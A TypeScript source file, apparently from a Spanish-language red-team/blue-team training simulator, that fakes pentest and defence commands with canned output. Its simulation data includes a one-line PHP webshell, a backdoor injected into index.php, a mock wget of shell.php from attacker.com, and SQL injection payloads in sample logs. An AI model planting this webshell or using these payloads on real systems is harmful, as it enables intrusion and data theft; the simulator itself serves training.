+ /login.php: Cookie PHPSESSID created without the httponly flag.
+ /login.php: Possible SQL injection vulnerability detected in login form.
+ /admin.php: Admin panel found (authentication may be required).
+ /config/: Directory indexing found. Potential information disclosure.
+ /backup/: Backup directory found. May contain sensitive files.
+ /robots.txt: File found. Contains disallow entries.
+ OSVDB-3092: /login.php: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
`;
        
        // Add vulnerability info if exists
        Object.values(targetHost.services).forEach((service: any) => {
            if (service.vulnerabilities) {
                service.vulnerabilities.forEach((vuln: any) => {
                    outputText += `+ VULN: ${vuln.cve} - ${vuln.description} [${vuln.severity.toUpperCase()}]\n`;
                });
            }
        });
        
        outputText += `
---------------------------------------------------------------------------
+ ${Math.floor(Math.random() * 1000) + 500} requests: 0 error(s) and ${Math.floor(Math.random() * 20) + 10} item(s) reported on remote host
+ End Time:           ${new Date().toISOString()} (${Math.floor(Math.random() * 60) + 30} seconds)
---------------------------------------------------------------------------`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 3000, newEnvironment: newEnv };
    },
    
    // =========================================================================
    // DIRB - DIRECTORY BRUTEFORCE (NEW)
    // =========================================================================
    dirb: async (args, { environment }) => {
        const target = args.find(a => a.includes('://') || !a.startsWith('-'));
        if (!target) return { output: [{ text: "Uso: dirb <url> [wordlist]", type: 'error' }] };
        
        const cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0];
        const targetHost = findHost(environment, cleanTarget);
        
        if (!targetHost) {
            return { output: [{ text: `-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: ${new Date().toISOString()}\nURL_BASE: ${target}\nERROR: Cannot connect to ${target}`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.reconnaissance.includes('dirb_scan')) {
            newEnv.attackProgress.reconnaissance.push('dirb_scan');
        }
        
        // Simulate discovered directories/files
        const discoveredItems = [
            { path: '/index.php', code: 200, size: 1234 },
            { path: '/login.php', code: 200, size: 2345 },
            { path: '/admin.php', code: 403, size: 287 },
            { path: '/config/', code: 403, size: 287 },
            { path: '/backup/', code: 403, size: 287 },
            { path: '/css/', code: 200, size: 0 },
            { path: '/js/', code: 200, size: 0 },
            { path: '/images/', code: 200, size: 0 },
            { path: '/robots.txt', code: 200, size: 102 },
            { path: '/.htaccess', code: 403, size: 287 },
            { path: '/wp-admin/', code: 404, size: 287 },
            { path: '/phpmyadmin/', code: 404, size: 287 },
        ];
        
        let outputText = `-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: ${new Date().toISOString()}
URL_BASE: http://${targetHost.ip}/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://${targetHost.ip}/ ----
`;
        
        discoveredItems.forEach(item => {
            if (item.code === 200) {
                outputText += `+ http://${targetHost.ip}${item.path} (CODE:${item.code}|SIZE:${item.size})\n`;
            } else if (item.code === 403) {
                outputText += `+ http://${targetHost.ip}${item.path} (CODE:${item.code}|SIZE:${item.size}) [FORBIDDEN - Interesting!]\n`;
            }
        });
        
        outputText += `
-----------------
END_TIME: ${new Date().toISOString()}
DOWNLOADED: 4612 - FOUND: ${discoveredItems.filter(i => i.code !== 404).length}
`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 4000, newEnvironment: newEnv };
    },
    
    // =========================================================================
    // WGET - ENHANCED FOR WEBSHELL DEPLOYMENT
    // =========================================================================
    wget: async (args, { environment, terminalState }) => {
        const outputFileIdx = args.findIndex(a => a === '-O' || a === '-o');
        const outputFile = outputFileIdx > -1 ? args[outputFileIdx + 1] : null;
        const url = args.find(a => a.includes('://') || (!a.startsWith('-') && args.indexOf(a) !== outputFileIdx + 1));
        
        if (!url) return { output: [{ text: "Uso: wget <url> [-O <archivo>]", type: 'error' }] };
        
        // Check if we're in a compromised host
        if (!terminalState.currentHostIp) {
            return { output: [{ text: `wget: no se puede descargar sin acceso a un host`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        
        // Simulate webshell download
        if (url.includes('shell.php') || url.includes('webshell') || url.includes('c99') || url.includes('r57')) {
            const targetPath = outputFile || '/var/www/html/shell.php';
            
            // Add file to host
            const hostIndex = newEnv.networks.dmz.hosts.findIndex(h => h.ip === terminalState.currentHostIp);
            if (hostIndex > -1) {
                newEnv.networks.dmz.hosts[hostIndex].files.push({
                    path: targetPath,
                    permissions: '644',
                    content: '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
                    hash: 'webshell_hash_malicious'
                });
                
                newEnv.attackProgress.persistence.push('webshell_deployed');
                
                newEnv.timeline.push({
                    id: Date.now(),
                    timestamp: new Date().toISOString(),
                    message: `Webshell descargado a ${targetPath}`,
                    team_visible: 'all',
                    source_team: 'red'
                });
            }
            
            const outputText = `--${new Date().toISOString()}--  ${url}
Resolving attacker.com (attacker.com)... 192.168.1.100
Connecting to attacker.com (attacker.com)|192.168.1.100|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1337 (1.3K) [application/x-php]
Saving to: '${targetPath}'

${targetPath}       100%[===================>]   1.31K  --.-KB/s    in 0s      

${new Date().toISOString()} (12.5 MB/s) - '${targetPath}' saved [1337/1337]`;
            
            return { 
                output: [{ text: outputText, type: 'output' }], 
                duration: 2000,
                newEnvironment: newEnv 
            };
        }
        
        // Generic download
        const outputText = `--${new Date().toISOString()}--  ${url}
Resolving server... done.
Connecting... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: '${outputFile || 'index.html'}'

${outputFile || 'index.html'}         [ <=>                ]   2.14K  --.-KB/s    in 0s      

${new Date().toISOString()} - '${outputFile || 'index.html'}' saved [2190]`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 1500 };
    },
    
    // =========================================================================
    // SQLMAP - SQL INJECTION TOOL (NEW)
    // =========================================================================
    sqlmap: async (args, { environment }) => {
        const urlIdx = args.findIndex(a => a === '-u' || a === '--url');
        const target = urlIdx > -1 ? args[urlIdx + 1] : args.find(a => a.includes('://'));
        
        if (!target) return { output: [{ text: "Uso: sqlmap -u <url> [opciones]", type: 'error' }] };
        
        const hasDump = args.includes('--dump') || args.includes('--dump-all');
        const hasDbs = args.includes('--dbs');
        
        const newEnv = R.clone(environment);
        newEnv.attackProgress.persistence.push('sqli_successful');
        
        let outputText = `
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ ${new Date().toTimeString().split(' ')[0]}

[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'user' is dynamic
[INFO] GET parameter 'user' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'user' might be injectable (possible DBMS: 'MySQL')
[INFO] testing for SQL injection on GET parameter 'user'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'user' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable

sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=admin' AND 8472=8472 AND 'ASDF'='ASDF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=admin' AND SLEEP(5) AND 'RRRR'='RRRR
---
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.46, PHP 7.4.3
back-end DBMS: MySQL >= 5.0.12
`;
        
        if (hasDbs) {
            outputText += `
[INFO] fetching database names
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db
`;
        }
        
        if (hasDump) {
            outputText += `
[INFO] fetching tables for database: 'webapp_db'
[INFO] fetching columns for table 'users' in database 'webapp_db'
[INFO] fetching entries for table 'users' in database 'webapp_db'
Database: webapp_db
Table: users
[3 entries]
+----+----------+------------------+------------+
| id | username | password         | role       |
+----+----------+------------------+------------+
| 1  | admin    | WebAdmin2024!    | superadmin |
| 2  | webadmin | WebAdmin2024!    | admin      |
| 3  | dbuser   | DbUser123        | user       |
+----+----------+------------------+------------+

[INFO] table 'webapp_db.users' dumped to CSV file
`;
            newEnv.attackProgress.persistence.push('data_exfiltrated');
        }
        
        outputText += `
[*] ending @ ${new Date().toTimeString().split(' ')[0]}
`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 5000, newEnvironment: newEnv };
    },
    
    hydra: async (args, { environment }) => {
        const userArg = args.includes('-l') ? args[args.indexOf('-l') + 1] : null;
        const targetArg = args.find(a => a.startsWith('ssh://'));
        if (!userArg || !targetArg) return { output: [{ text: "Uso: hydra -l <user> -P <wordlist> ssh://<host>", type: 'error'}] };
        
        const host = targetArg.replace('ssh://', '');
        const targetHost = findHost(environment, host);
        if (!targetHost) return { output: [{ text: `Host desconocido: ${host}`, type: 'error' }] };

        const isBlocked = environment.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
        if (isBlocked) {
            return { output: [{ text: `[ERROR] target ${host} - connection refused`, type: 'error' }], duration: 2000 };
        }

        if (userArg === 'root') {
             const sshConfig = targetHost.files.find(f => f.path === '/etc/ssh/sshd_config');
            if (sshConfig?.content.includes('PermitRootLogin no')) {
                return { output: [{ text: `[ERROR] target ssh://${targetHost.ip}:22/ does not support password authentication (method reply 4).`, type: 'output' }], duration: 3000 };
            }
        }
        
        const userAccount = targetHost.users.find(u => u.username === userArg);
        const passwordFound = userAccount && (userAccount.password === 'toor' || userAccount.password === 'P@ssw0rd');

        let newEnv = updateHostState(environment, targetHost.ip, { failedLogins: (targetHost.systemState?.failedLogins || 0) + 20 });
        
        if (passwordFound) {
            newEnv.attackProgress.credentials[`${userArg}@${targetHost.ip}`] = userAccount.password;
            const output = `Hydra v9.5 (c) 2023 by van Hauser/THC\n[DATA] attacking ssh://${targetHost.ip}:22/\n[STATUS] 8.00 tries/min, 20 tries in 00:01h, 16 active\n[22][ssh] host: ${targetHost.ip}    login: ${userArg}    password: ${userAccount.password}\n1 of 1 target successfully completed, 1 valid password found`;
            return {
                output: [{ html: `<pre>${output}</pre>`, type: 'html' }],
                duration: 5000,
                newEnvironment: newEnv
            };
        }
        return { output: [{ text: 'No se encontraron contraseñas válidas.', type: 'output' }], duration: 5000, newEnvironment: newEnv };
    },
    
    'sudo': async (args, context) => {
        const cmd = args[0];
        if (!cmd) return { output: [{text: "sudo: se requiere un comando", type: 'error'}] };
        const handler = commandLibrary[cmd];
        if (!handler) return { output: [{text: `sudo: ${cmd}: comando no encontrado`, type: 'error'}]};
        return handler(args.slice(1), context);
    },
    
    // =========================================================================
    // BLUE TEAM SPECIFIC COMMANDS (INTEGRATED)
    // =========================================================================

    // FASE 1: DETECCIÓN TEMPRANA - tail
    tail: async (args, { environment, terminalState, userTeam }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const isFollow = args.includes('-f');
        const nIndex = args.indexOf('-n');
        // Unused var cleanup: numLines
        const file = args.find(a => !a.startsWith('-') && a !== args[nIndex + 1]);
        
        if (!file) return { output: [{text: "tail: se requiere un archivo", type: 'error'}] };
        
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        const newEnv = R.clone(environment);
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `tail ${args.join(' ')}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        let output = '';
        
        // Logs de Apache access.log con patrones de ataque SQL Injection
        if (file.includes('access.log')) {
            output = `192.168.1.100 - - [18/Nov/2024:10:14:55 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.100 - - [18/Nov/2024:10:14:56 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "Nmap Scripting Engine"
192.168.1.100 - - [18/Nov/2024:10:14:57 +0000] "GET /.git/config HTTP/1.1" 404 196 "-" "nikto/2.1.6"
192.168.1.100 - - [18/Nov/2024:10:15:01 +0000] "GET /login.php HTTP/1.1" 200 2345 "-" "Mozilla/5.0"
192.168.1.100 - - [18/Nov/2024:10:15:02 +0000] "POST /login.php HTTP/1.1" 200 456 "-" "user=admin' OR '1'='1&pass=anything"
192.168.1.100 - - [18/Nov/2024:10:15:03 +0000] "POST /login.php HTTP/1.1" 200 456 "-" "user=admin'--&pass=x"
192.168.1.100 - - [18/Nov/2024:10:15:04 +0000] "POST /login.php HTTP/1.1" 200 789 "-" "user=admin' UNION SELECT * FROM users--"
192.168.1.100 - - [18/Nov/2024:10:15:05 +0000] "GET /admin.php HTTP/1.1" 200 5678 "-" "Mozilla/5.0"
192.168.1.100 - - [18/Nov/2024:10:15:06 +0000] "GET /admin.php?action=dump_db HTTP/1.1" 200 9999 "-" "Mozilla/5.0"
192.168.1.100 - - [18/Nov/2024:10:15:10 +0000] "POST /admin.php HTTP/1.1" 200 1234 "-" "file=shell.php"`;
        } 
        // Logs de Apache error.log con errores SQL
        else if (file.includes('error.log')) {
            output = `[Wed Nov 18 10:14:56.123456 2024] [core:notice] [pid 1234] AH00094: Command line: '/usr/sbin/apache2'
[Wed Nov 18 10:15:01.234567 2024] [php:warn] [pid 1235] [client 192.168.1.100:54321] PHP Warning: SQL syntax error near '' OR '1'='1'
[Wed Nov 18 10:15:02.345678 2024] [php:warn] [pid 1235] [client 192.168.1.100:54322] PHP Warning: SQL syntax error near '--'
[Wed Nov 18 10:15:03.456789 2024] [php:error] [pid 1236] [client 192.168.1.100:54323] PHP Fatal error: Potential SQL injection attempt detected
[Wed Nov 18 10:15:04.567890 2024] [php:notice] [pid 1236] [client 192.168.1.100:54324] Unauthorized access to admin.php from suspicious IP
[Wed Nov 18 10:15:10.678901 2024] [php:warn] [pid 1237] [client 192.168.1.100:54325] PHP Warning: File upload detected: shell.php`;
        } 
        // Logs de autenticación
        else if (file.includes('auth.log')) {
            const failed = host.systemState?.failedLogins || 5;
            for (let i = 0; i < Math.min(failed, 10); i++) {
                output += `Nov 18 10:15:${20+i} ${host.hostname} sshd[123${i}]: Failed password for root from 192.168.1.100 port 5432${i} ssh2\n`;
            }
            output += `Nov 18 10:15:30 ${host.hostname} sshd[1240]: Accepted password for root from 192.168.1.100 port 54330 ssh2`;
        }
        // Archivo genérico
        else {
            const fileObj = host.files.find(f => f.path === file || f.path.endsWith(file.split('/').pop() || ''));
            if (!fileObj) return { output: [{text: `tail: cannot open '${file}' for reading: No such file or directory`, type: 'error'}] };
            output = fileObj.content || '(archivo vacío)';
        }
        
        if (isFollow) {
            output = `==> ${file} <==\n${output}\n\n[Monitoreo en tiempo real activo - Presiona Ctrl+C para salir]`;
        }
        
        return { output: [{ text: output, type: 'output' }], newEnvironment: newEnv };
    },

    // FASE 3: CONTENCIÓN - ufw (COMPLETAMENTE FUNCIONAL)
    ufw: async (args, { environment, terminalState, userTeam }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const newEnv = R.clone(environment);
        const action = args[0];
        
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `sudo ufw ${args.join(' ')}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        switch(action) {
            case 'status':
                const fw = newEnv.networks.dmz.firewall;
                let statusOutput = fw.enabled 
                    ? `Status: active\n\nTo                         Action      From\n--                         ------      ----\n`
                    : `Status: inactive`;
                if (fw.enabled) {
                    fw.rules.forEach(rule => {
                        const port = rule.destPort ? `${rule.destPort}/${rule.protocol}` : 'Anywhere';
                        const from = rule.sourceIP || 'Anywhere';
                        statusOutput += `${port.padEnd(27)}${rule.action.toUpperCase().padEnd(12)}${from}\n`;
                    });
                    // Mostrar IPs bloqueadas
                    newEnv.defenseProgress.blockedIPs.forEach(ip => {
                        statusOutput += `${'Anywhere'.padEnd(27)}${'DENY'.padEnd(12)}${ip}\n`;
                    });
                }
                return { output: [{ text: statusOutput, type: 'output' }], newEnvironment: newEnv };
                
            case 'enable':
                newEnv.networks.dmz.firewall.enabled = true;
                return { output: [{ text: "Firewall is active and enabled on system startup", type: 'output' }], newEnvironment: newEnv };
                
            case 'disable':
                newEnv.networks.dmz.firewall.enabled = false;
                return { output: [{ text: "Firewall stopped and disabled on system startup", type: 'output' }], newEnvironment: newEnv };
                
            case 'deny':
                // Manejar: ufw deny from [IP]
                if (args[1] === 'from' && args[2]) {
                    const ip = args[2];
                    if (!newEnv.defenseProgress.blockedIPs.includes(ip)) {
                        newEnv.defenseProgress.blockedIPs.push(ip);
                    }
                    // Agregar regla al firewall
                    newEnv.networks.dmz.firewall.rules.push({
                        id: `fw-deny-${Date.now()}`,
                        action: 'deny',
                        protocol: 'any',
                        sourceIP: ip
                    });
                    return { output: [{ text: `Rule added: deny from ${ip} to any`, type: 'output' }], newEnvironment: newEnv };
                }
                // Manejar: ufw deny [port]
                const denyPort = parseInt(args[1]);
                if (!isNaN(denyPort)) {
                    newEnv.networks.dmz.firewall.rules.push({
                        id: `fw-deny-${Date.now()}`,
                        action: 'deny',
                        protocol: 'tcp',
                        destPort: denyPort
                    });
                    return { output: [{ text: `Rule added: deny ${denyPort}/tcp`, type: 'output' }], newEnvironment: newEnv };
                }
                return { output: [{ text: "Usage: ufw deny from <IP> OR ufw deny <port>", type: 'error' }] };
                
            case 'allow':
                const allowPort = parseInt(args[1]) || (args[1]?.split('/')[0] ? parseInt(args[1].split('/')[0]) : null);
                if (allowPort) {
                    newEnv.networks.dmz.firewall.rules.push({
                        id: `fw-allow-${Date.now()}`,
                        action: 'allow',
                        protocol: 'tcp',
                        destPort: allowPort
                    });
                    return { output: [{ text: `Rule added: allow ${allowPort}/tcp`, type: 'output' }], newEnvironment: newEnv };
                }
                return { output: [{ text: "Usage: ufw allow <port>", type: 'error' }] };
                
            default:
                return { output: [{ text: "Usage: ufw [enable|disable|status|allow|deny]", type: 'error' }] };
        }
    },

    chmod: async (args, { environment, terminalState }) => {
         if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        if (args.length < 2) return { output: [{text: "chmod: falta un operando", type: 'error'}] };
        
        const perms = args[0];
        const path = args[1];
        
        const newEnv = R.clone(environment);
        const hostPath = ['networks', 'dmz', 'hosts', 0];
        let host = R.path(hostPath, newEnv) as VirtualHost;

        const fileIndex = host.files.findIndex(f => f.path === path);
        if (fileIndex === -1) return { output: [{text: `chmod: no se puede acceder a '${path}': No existe el fichero o el directorio`, type: 'error'}] };
        
        host.files[fileIndex].permissions = perms;

        return { output: [], newEnvironment: R.set(R.lensPath(hostPath), host, newEnv) };
    },
    
    // =========================================================================
    // NANO - ENHANCED FOR SCENARIO 11 REPORTS & REMEDIATION
    // =========================================================================
    nano: async (args, { environment, terminalState, activeScenario, userTeam }) => {
        if (!terminalState.currentHostIp && !activeScenario) {
            return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        }
        if (args.length < 1) return { output: [{text: "nano: se requiere un nombre de archivo para editar", type: 'error'}] };
        
        const path = args[0];
        const newEnv = R.clone(environment);
        
        // Handle special paths for Scenario 11 reports
        if (path.includes('red_team_report.txt') || path.includes('incident_report.txt')) {
            // Determine which team is writing the report
            const isRedTeamReport = path.includes('red_team_report.txt');
            
            newEnv.timeline.push({
                id: Date.now(),
                timestamp: new Date().toISOString(),
                message: `nano ${path}`,
                team_visible: 'all',
                source_team: isRedTeamReport ? 'red' : 'blue'
            });
            
            const message = `
[ GNU nano 5.4 ]                [ ${path} ]

${isRedTeamReport ? `
╔══════════════════════════════════════════════════════════════════════════════╗
║                    REPORTE TÉCNICO DE PENTESTING                             ║
║                          Equipo Rojo - Cyber Valtorix                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

1. RESUMEN EJECUTIVO
   Sistema objetivo: APP-SERVER-01 (10.0.50.10)
   Nivel de riesgo: CRÍTICO
   Resumen: Se explotó exitosamente una vulnerabilidad de SQL Injection...

2. ALCANCE DEL PENTESTING
   - Host: APP-SERVER-01
   - Servicios: SSH (22), HTTP (80), HTTPS (443), MySQL (3306)

3. HALLAZGOS
   CVE-2021-WEBAPP: SQL Injection en login.php [CRÍTICO]
   ...

` : `
╔══════════════════════════════════════════════════════════════════════════════╗
║                    REPORTE DE INCIDENTE - FORMATO ESIT                       ║
║                          Equipo Azul - Cyber Valtorix                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

SECCIÓN 1: INFORMACIÓN DEL INCIDENTE
  Fecha de Detección: ${new Date().toISOString()}
  Tipo: SQL Injection + Webshell
  Severidad: CRÍTICA
  Sistema Afectado: APP-SERVER-01

SECCIÓN 2: DESCRIPCIÓN DETALLADA
  ...

SECCIÓN 3: ANÁLISIS DE IMPACTO
  ...

`}

[ Guardando reporte... ]
[ Wrote ${Math.floor(Math.random() * 100) + 50} lines to ${path} ]
`;
            
            return { 
                output: [{ text: message, type: 'output' }], 
                duration: 1500, 
                newEnvironment: newEnv 
            };
        }
        
        // Original nano behavior for other files
        if (!terminalState.currentHostIp) {
            return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        }
        
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `nano ${path}`,
            team_visible: 'all',
            source_team: userTeam
        });

        const hostPath = ['networks', 'dmz', 'hosts', 0];
        let host = R.path(hostPath, newEnv) as VirtualHost;
        const fileIndex = host.files.findIndex(f => f.path === path);
        if (fileIndex === -1) return { output: [{text: `[ Error leyendo ${path}: No existe el fichero o el directorio ]`, type: 'error'}] };

        let message = `File ${path} saved. (Simulado)`;
        
        if (path === '/etc/ssh/sshd_config') {
            if (host.files[fileIndex].content.includes('PermitRootLogin yes')) {
                host.files[fileIndex].content = host.files[fileIndex].content.replace('PermitRootLogin yes', 'PermitRootLogin no');
                message = `[ Wrote 120 lines to ${path} ] (PermitRootLogin updated to 'no')`;
            }
        } else if (path === '/var/www/html/index.php') {
            // Red Team Backdoor
            host.files[fileIndex].content = '<?php if(isset($_GET["x"])){system($_GET["x"]);} ?>' + host.files[fileIndex].content;
            host.files[fileIndex].hash = 'hacked_hash_modified_index';
            newEnv.attackProgress.persistence.push('index_modified');
            message = `[ Wrote 5 lines to ${path} ] (Backdoor injected)`;
        } else if (path === '/var/www/html/login.php') {
            // Blue Team patching SQL injection
            host.files[fileIndex].content = `<?php
// PATCHED: Using prepared statements
$user = $_POST["user"];
$pass = $_POST["pass"];
$stmt = $pdo->prepare("SELECT * FROM users WHERE user = ? AND pass = ?");
$stmt->execute([$user, $pass]);
?>`;
            host.files[fileIndex].hash = 'patched_login_hash';
            newEnv.defenseProgress.patchedVulnerabilities.push('CVE-2021-WEBAPP');
            message = `[ Wrote 8 lines to ${path} ] (SQL Injection patched with prepared statements)`;
        }
        
        return { output: [{text: message, type: 'output'}], duration: 1500, newEnvironment: R.set(R.lensPath(hostPath), host, newEnv) };
    },
    
    // FASE 4: CONTENCIÓN - systemctl (COMPLETAMENTE FUNCIONAL)
    systemctl: async (args, { environment, terminalState, userTeam }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const action = args[0];
        const service = args[1];
        
        if (!action) return { output: [{text: "systemctl: se requiere un comando (start, stop, restart, status)", type: 'error'}] };
        
        const newEnv = R.clone(environment);
        const host = findHost(newEnv, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `sudo systemctl ${action} ${service || ''}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        const timestamp = new Date().toISOString();
        
        switch(action) {
            case 'stop':
                if (service === 'apache2' || service === 'nginx' || service === 'httpd') {
                    // Cerrar puertos web
                    if (host.services && host.services[80]) host.services[80].state = 'closed';
                    if (host.services && host.services[443]) host.services[443].state = 'closed';
                    return { 
                        output: [{text: `● ${service}.service - The Apache HTTP Server
   Loaded: loaded (/lib/systemd/system/${service}.service; enabled; vendor preset: enabled)
   Active: inactive (dead) since ${timestamp}
  Process: 1234 ExecStop=/usr/sbin/apachectl stop (code=exited, status=0/SUCCESS)
 Main PID: 1234 (code=exited, status=0/SUCCESS)

Nov 18 10:20:00 APP-SERVER-01 systemd[1]: Stopping The Apache HTTP Server...
Nov 18 10:20:01 APP-SERVER-01 systemd[1]: Stopped The Apache HTTP Server.`, type: 'output'}], 
                        newEnvironment: newEnv 
                    };
                }
                if (service === 'mysql' || service === 'mariadb' || service === 'mysqld') {
                    if (host.services && host.services[3306]) host.services[3306].state = 'closed';
                    return { 
                        output: [{text: `● ${service}.service - MySQL Community Server
   Loaded: loaded (/lib/systemd/system/${service}.service; enabled; vendor preset: enabled)
   Active: inactive (dead) since ${timestamp}
  Process: 1235 ExecStop=/usr/bin/mysqladmin shutdown (code=exited, status=0/SUCCESS)

Nov 18 10:20:02 APP-SERVER-01 systemd[1]: Stopping MySQL Community Server...
Nov 18 10:20:03 APP-SERVER-01 systemd[1]: Stopped MySQL Community Server.`, type: 'output'}], 
                        newEnvironment: newEnv 
                    };
                }
                if (service === 'sshd' || service === 'ssh') {
                    return { output: [{text: `● ${service}.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/${service}.service; enabled)
   Active: inactive (dead) since ${timestamp}`, type: 'output'}], newEnvironment: newEnv };
                }
                return { output: [{text: `Failed to stop ${service}.service: Unit ${service}.service not found.`, type: 'error'}] };
                
            case 'start':
                if (service === 'apache2' || service === 'nginx') {
                    if (host.services && host.services[80]) host.services[80].state = 'open';
                    return { output: [{text: `● ${service}.service - The Apache HTTP Server
   Loaded: loaded (/lib/systemd/system/${service}.service; enabled)
   Active: active (running) since ${timestamp}
 Main PID: 1236

Nov 18 10:25:00 APP-SERVER-01 systemd[1]: Starting The Apache HTTP Server...
Nov 18 10:25:01 APP-SERVER-01 systemd[1]: Started The Apache HTTP Server.`, type: 'output'}], newEnvironment: newEnv };
                }
                if (service === 'mysql') {
                    if (host.services && host.services[3306]) host.services[3306].state = 'open';
                    return { output: [{text: `● ${service}.service - MySQL Community Server
   Loaded: loaded (/lib/systemd/system/${service}.service; enabled)
   Active: active (running) since ${timestamp}

Nov 18 10:25:02 APP-SERVER-01 systemd[1]: Started MySQL Community Server.`, type: 'output'}], newEnvironment: newEnv };
                }
                return { output: [{text: `Starting ${service}.service... done.`, type: 'output'}], newEnvironment: newEnv };
                
            case 'restart':
                return { output: [{text: `● ${service}.service
   Loaded: loaded (/lib/systemd/system/${service}.service; enabled)
   Active: active (running) since ${timestamp}

Nov 18 10:25:05 APP-SERVER-01 systemd[1]: ${service}.service: Succeeded.
Nov 18 10:25:05 APP-SERVER-01 systemd[1]: Stopped ${service}.
Nov 18 10:25:06 APP-SERVER-01 systemd[1]: Starting ${service}...
Nov 18 10:25:07 APP-SERVER-01 systemd[1]: Started ${service}.`, type: 'output'}], newEnvironment: newEnv };
                
            case 'status':
                const isRunning = service === 'apache2' ? (host.services?.[80]?.state === 'open') : true;
                return { output: [{text: `● ${service}.service - ${service.charAt(0).toUpperCase() + service.slice(1)} Service
   Loaded: loaded (/lib/systemd/system/${service}.service; enabled; vendor preset: enabled)
   Active: ${isRunning ? 'active (running)' : 'inactive (dead)'} since ${timestamp}
 Main PID: ${Math.floor(Math.random() * 10000) + 1000} (${service})
    Tasks: ${Math.floor(Math.random() * 50) + 10}
   Memory: ${Math.floor(Math.random() * 200) + 50}M
   CGroup: /system.slice/${service}.service`, type: 'output'}] };
                
            default:
                return { output: [{text: `systemctl: comando desconocido '${action}'`, type: 'error'}] };
        }
    },
    
    top: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host || !host.systemState) return { output: [] };
        const { cpuLoad, networkConnections } = host.systemState;
        
        const loadVal = cpuLoad > 50 ? (cpuLoad / 10) + 2 : 0.05;
        const loadStr = `${loadVal.toFixed(2)}, ${(loadVal * 0.9).toFixed(2)}, ${(loadVal * 0.8).toFixed(2)}`;
        
        const isUnderAttack = cpuLoad > 90;
        const processList = isUnderAttack 
            ? ` 1234 root       20   0  123456  45678  12345 R  89.3   5.6   0:45.67 ksoftirqd/0\n 5678 root       20   0  234567  56789  23456 R  87.1   6.8   0:42.34 ksoftirqd/1`
            : `  952 root       20   0 1234564  23456  12344 S   0.3   0.5   1:23.45 systemd\n 1023 www-data  20   0  654321  45612   3456 S   0.1   1.2   0:12.34 apache2`;

        const outputText = `top - ${new Date().toTimeString().split(' ')[0]} up 5 days,  3:21,  2 users,  load average: ${loadStr}
Tasks: ${Math.floor(networkConnections/5) + 100} total,   ${isUnderAttack ? '5' : '1'} running,   ${Math.floor(networkConnections/5) + 99} sleeping,   0 stopped,   0 zombie
%Cpu(s): ${isUnderAttack ? '12.3' : '1.5'} us,  ${isUnderAttack ? '84.7' : '0.5'} sy,  0.0 ni, ${isUnderAttack ? '1.2' : '98.0'} id,  0.9 wa,  0.9 hi,  0.0 si,  0.0 st
MiB Mem :   7962.7 total,    256.3 free,   ${isUnderAttack ? '6234.1' : '1234.1'} used,   1472.3 buff/cache
MiB Swap:   2048.0 total,   1876.2 free,    171.8 used.   1234.5 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
